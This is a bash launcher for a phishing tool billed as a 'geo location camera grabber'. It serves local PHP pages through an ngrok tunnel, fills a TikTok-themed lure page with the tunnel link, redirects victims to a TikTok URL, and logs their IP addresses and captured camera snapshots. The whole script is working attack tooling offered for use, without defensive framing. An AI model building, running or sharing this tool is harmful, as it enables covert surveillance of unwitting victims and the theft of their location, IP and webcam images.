#!/bin/bash

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _      _  _   _  _____  ____    _   _  ____  ____  _  _  ____  ____  \e[0m\n"
printf "\e[1;92m / \  /|/ \/ \ / \/__ __\/  __/   / \ / \/  _ \/   _\/ \/ \/  _ \/  __\ \e[0m\n"
printf "\e[1;92m | |  ||| || |_| |  / \  |  \     | |_| || / \||  /  | | //| / \||  \/| \e[0m\n"
printf "\e[1;92m | |/\||| ||  _  |  | |  |  /_    |  _  || |-|||  \_ | \// | |-|||    / \e[0m\n"
printf "\e[1;92m \_/  \|\_/\_/ \_/  \_/  \____\   \_/ \_/\_/ \|\____/\_/\_/\_/ \|\_/\_\ \e[0m\n"
printf "\e[1;93m          [ WHITE HACKER GEO LOCATION CAMERA GRABER ]          \e[0m\n"
printf " \e[1;77m Tracker: Camera + Precision GPS | Redirect: TikTok Pro \e[0m \n"
printf "\n"
}

stop() {
    pkill -f ngrok > /dev/null 2>&1
    pkill -f php > /dev/null 2>&1
    exit 1
}

nuclear_clean() {
    fuser -k 3333/tcp > /dev/null 2>&1
    pkill -9 -f ngrok > /dev/null 2>&1
    pkill -9 -f php > /dev/null 2>&1
    sleep 1
}

payload_config() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\(.ngrok-free.app\|.ngrok.io\|.ngrok-free.dev\)' | head -n1)
    sed "s+forwarding_link+$link+g" template.php > index.php
    sed "s+forwarding_link+$link+g" tiktok.html > index3.html
    sed "s+tiktok_redir_link+$tiktok_url+g" index3.html > index2.html
    rm -rf index3.html > /dev/null 2>&1
}

ngrok_server() {
    nuclear_clean
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    ngrok http 3333 > /dev/null 2>&1 &
    
    for i in {1..15}; do
        sleep 2
        link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\(.ngrok-free.app\|.ngrok.io\|.ngrok-free.dev\)' | head -n1)
        if [[ -n "$link" ]]; then
            printf "\e[1;92m[+] Link: %s\e[0m\n" $link
            payload_config
            checkfound
            return
        fi
    done
    stop
}

checkfound() {
    while true; do
        if [[ -e "ip.txt" ]]; then
            ip=$(grep -a 'IP:' ip.txt | tail -n1 | cut -d " " -f2 | tr -d '\r')
            printf "\e[1;92m[+] Hit: $ip\e[0m\n"
            rm -rf ip.txt
        fi
        if [[ -e "Log.log" ]]; then
            printf "\e[1;92m[+] Snapshot Captured.\e[0m\n"
            rm -rf Log.log
        fi
        sleep 1
    done 
}

banner
read -p "[+] TikTok Redirect URL: " tiktok_url
ngrok_server
